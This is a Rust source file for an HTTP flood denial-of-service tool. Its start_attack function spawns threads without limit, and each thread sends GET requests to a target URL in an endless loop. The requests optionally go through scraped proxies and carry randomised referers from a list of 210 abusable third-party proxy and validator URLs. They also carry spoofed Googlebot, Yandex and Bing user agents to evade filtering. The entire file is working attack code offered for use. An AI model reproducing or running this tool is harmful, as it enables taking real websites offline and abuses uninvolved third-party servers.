use rand::seq::SliceRandom;
use reqwest::{ blocking, header::* };
use std::thread;
use std::time::{ Duration };

use crate::scrapper;

pub const REFERERS: [&'static str; 210] = [
    "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
    "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
    "https://drive.google.com/viewerng/viewer?url=",
    "http://www.google.com/translate?u=",
    "https://developers.google.com/speed/pagespeed/insights/?url=",
    "http://help.baidu.com/searchResult?keywords=",
    "http://www.bing.com/search?q=",
    "https://add.my.yahoo.com/rss?url=",
    "https://play.google.com/store/search?q=",
    "http://www.google.com/?q=",
    "http://regex.info/exif.cgi?url=",
    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
    "http://www.google.com/translate?u=",
    "http://translate.google.com/translate?u=",
    "http://validator.w3.org/feed/check.cgi?url=",
    "http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
    "http://validator.w3.org/check?uri=",
    "http://jigsaw.w3.org/css-validator/validator?uri=",
    "http://validator.w3.org/checklink?uri=",
    "http://www.w3.org/RDF/Validator/ARPServlet?URI=",
    "http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=",
    "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=",
    "http://validator.w3.org/mobile/check?docAddr=",
    "http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
    "http://online.htmlvalidator.com/php/onlinevallite.php?url=",
    "http://feedvalidator.org/check.cgi?url=",
    "http://gmodules.com/ig/creator?url=",
    "http://www.google.com/ig/adde?moduleurl=",
    "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=",
    "http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
    "http://host-tracker.com/check_page/?furl=",
    "http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
    "http://www.onlinewebcheck.com/check.php?url=",
    "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
    "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=",
    "http://about42.nl/www/showheaders.php;POST;about42.nl.txt",
    "http://browsershots.org;POST;browsershots.org.txt",
    "http://streamitwebseries.twww.tv/proxy.php?url=",
    "http://www.comicgeekspeak.com/proxy.php?url=",
    "http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
    "http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt",
    "http://web-sniffer.net/?url=",
    "http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=",
    "http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=",
    "http://translate.yandex.net/tr-url/ru-uk.uk/",
    "http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=",
    "http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
    "http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS",
    "http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
    "http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
    "http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
    "http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=",
    "http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=",
    "http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=",
    "http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
    "http://validator.w3.org/nu/?doc=",
    "http://check-host.net/check-http?host=",
    "http://www.netvibes.com/subscribe.php?url=",
    "http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.google.com/ig/add?feedurl=",
    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
    "http://www.google.com/translate?u=",
    "http://translate.google.com/translate?u=",
    "http://validator.w3.org/feed/check.cgi?url=",
    "http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
    "http://validator.w3.org/check?uri=",
    "http://jigsaw.w3.org/css-validator/validator?uri=",
    "http://validator.w3.org/checklink?uri=",
    "http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
    "http://www.w3.org/RDF/Validator/ARPServlet?URI=",
    "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=",
    "http://www.w3.org/services/tidy?docAddr=",
    "http://validator.w3.org/mobile/check?docAddr=",
    "http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
    "http://validator.w3.org/p3p/20020128/policy.pl?uri=",
    "http://online.htmlvalidator.com/php/onlinevallite.php?url=",
    "http://feedvalidator.org/check.cgi?url=",
    "http://gmodules.com/ig/creator?url=",
    "http://www.google.com/ig/adde?moduleurl=",
    "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=",
    "http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
    "http://host-tracker.com/check_page/?furl=",
    "http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
    "http://www.viewdns.info/ismysitedown/?domain=",
    "http://www.onlinewebcheck.com/check.php?url=",
    "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
    "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=",
    "http://streamitwebseries.twww.tv/proxy.php?url=",
    "http://www.comicgeekspeak.com/proxy.php?url=",
];
pub const USER_AGENTS: [&'static str; 84] = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)	2.1	--	Server	Common",
    "Mozilla/5.0 (compatible; Googlebot/2.1; startmebot/1.0; +https://start.me/bot)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/27.0.1453 Safari/537.36 GoogleBot/2.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Version/6.0 Mobile/10A525 Safari/8536.25 GoogleBot/2.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview Analytics) Chrome/27.0.1453 Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible;acapbot/0.1;treat like Googlebot)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://import.io)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.4 (KHTML, like Gecko; Google Page Speed Insights) Chrome/22.0.1229 Safari/537.4 GoogleBot/2.1",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview Analytics) Chrome/41.0.2272.118 Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "OnPageBot (compatible; Googlebot 2.1; +https://bot.onpage.org/)",
    "Google Crawler: Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1 +http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 (compatible;acapbot/0.1.;treat like Googlebot)",
    "Mozilla/5.0 (iPhone; U; CPU iPhone 0S 3.0 like Mac 0S X; en-us; compatible; Googlebot/2.1; http://www.google.com/bot.html; AppleWebKit/528.18(KHTML,like Gecko) Version/4.0 Mobile/7A341 Safari/528.16 UNTRUSTED/1.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html",
    "Apple-iPhone4C1/1001.523 (compatible;acapbot/0.1;treat like Googlebot)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)/Nutch-2.3.1",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; https://deepcrawl.com/bot)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; https://www.deepcrawl.com/bot)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) UNTRUSTED/1.0",
    "Mozilla/5.0 (compatible; WebHistoryBot/1.2.1 IS NOT SE bot like Googlebot/2.1; +http://www.google.com/bot.html,Yahoo! Slurp or Bingbot)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html) <iframe src=\"whatismyip.com\"></iframe>",
    "Googlebot/2.1; http://www.google.com/bot.html",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html )",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36 Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) AlexaToolbar/alxf-2.17",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) FirePHP/0.7.4",
    "NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (iPhone; U; CPU iPhone 0S 3.0 like Mac 0S X; en-us; compatible; Googlebot/2.1; http://www.google.com/bot.html; AppleWebKit/528.18(KHTML,like Gecko) Version/4.0 Mobile/7A341 Safari/528.16 UNTRUSTED/1.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/537.4 (KHTML, like Gecko; Google Page Speed Insights) Version/6.0 Mobile/10A525 Safari/8536.25 GoogleBot/2.1",
    "Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html) (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "BotThief (compatible; Googlebot/2.1; Location RU)",
    "Mozilla/5.0+(compatible;+googlebot/2.1;++http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; YandexAccessibilityBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexAdNet/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; MirrorDetector; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexCalendar/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexDirect/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexDirectDyn/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YaDirectFetcher/1.0; Dyatel; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexFavicons/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexForDomain/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexImageResizer/2.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexMobileBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexMarket/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexMedia/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots yabs01)",
    "Mozilla/5.0 (compatible; YandexNews/4.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexOntoDB/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexOntoDBAPI/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexPagechecker/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexSearchShop/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexSitelinks; Dyatel; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexSpravBot/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexTurbo/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexVertis/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexVerticals/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexVideo/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexVideoParser/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexWebmaster/2.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 (compatible; YandexScreenshotBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 (compatible; YandexMedianaBot/1.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 530) like Gecko (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 530) like Gecko (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b",
    "Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 530) like Gecko BingPreview/1.0b",
];

static mut REQS: i32 = 0;
static mut RPS: i32 = 0;

pub struct Config {
    pub url: String,
    pub method: String,
    pub random_referers: bool,
    pub random_user_agents: bool,
    pub proxy: bool,
}

pub fn start_attack(config: Config) {
    let proxies = scrapper::get_proxies();

    thread::spawn(|| {
        loop {
            unsafe {
                thread::sleep(Duration::from_millis(1000));
                println!("RPS: {}", RPS);
                println!("TOTAL: {}", REQS);
                RPS = 0;
            }
        }
    });

    loop {
        let url = config.url.clone();
        let pr = proxies.clone();
        thread::spawn(move || {
            let proxy = pr.choose(&mut rand::thread_rng()).unwrap();
            let mut headers = HeaderMap::new();
            let client;
            if config.proxy {
                client = blocking::ClientBuilder
                    ::new()
                    .proxy(reqwest::Proxy::https(format!("{}:{}", proxy.ip, proxy.port)).unwrap())
                    .build()
                    .unwrap();
            } else {
                client = blocking::Client::new();
            }

            if config.random_referers {
                headers.insert(
                    REFERER,
                    REFERERS.choose(&mut rand::thread_rng()).unwrap().parse().unwrap()
                );
            }

            if config.random_user_agents {
                headers.insert(
                    USER_AGENT,
                    USER_AGENTS.choose(&mut rand::thread_rng()).unwrap().parse().unwrap()
                );
            }

            unsafe {
                loop {
                    let url = url.clone();
                    let headers = headers.clone();
                    match client.get(url).headers(headers).send() {
                        Ok(..) => {
                            REQS = REQS + 1;
                            RPS = RPS + 1;
                        }
                        Err(..) => {}
                    }
                }
            }
        });
    }
}